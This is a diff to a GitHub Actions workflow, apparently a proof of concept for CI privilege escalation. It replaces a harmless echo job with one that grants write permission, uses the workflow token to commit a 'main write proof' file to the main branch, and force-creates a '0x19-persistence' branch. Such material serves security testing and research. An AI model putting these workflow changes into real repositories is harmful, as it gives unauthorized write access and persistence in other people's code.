@@ -1,11 +1,27 @@
-# 0x19 base ci (replaced by fork PR)
+# 0x19 final escalation: main write + persistence branch (github.token only)
 name: ci
 on:
   pull_request:
   push:
     branches: [main]
+permissions:
+  contents: write
 jobs:
-  echo:
+  main-write:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "0x19 base ci"
+      - name: write-main-file
+        if: github.event_name == 'push'
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          NAME="0x19-main-write-${GITHUB_RUN_ID}.txt"
+          CONTENT="$(printf '0x19 main write proof %s\n' "$GITHUB_RUN_ID" | base64 -w0)"
+          gh api -X PUT "repos/${GITHUB_REPOSITORY}/contents/${NAME}" -f message="0x19 main write proof" -f content="$CONTENT"
+      - name: persistence-branch
+        if: github.event_name == 'push'
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          gh api -X POST "repos/${GITHUB_REPOSITORY}/git/refs" -f ref=refs/heads/0x19-persistence -f sha="${GITHUB_SHA}" || \
+          gh api -X PATCH "repos/${GITHUB_REPOSITORY}/git/refs/heads/0x19-persistence" -f sha="${GITHUB_SHA}" -f force=true
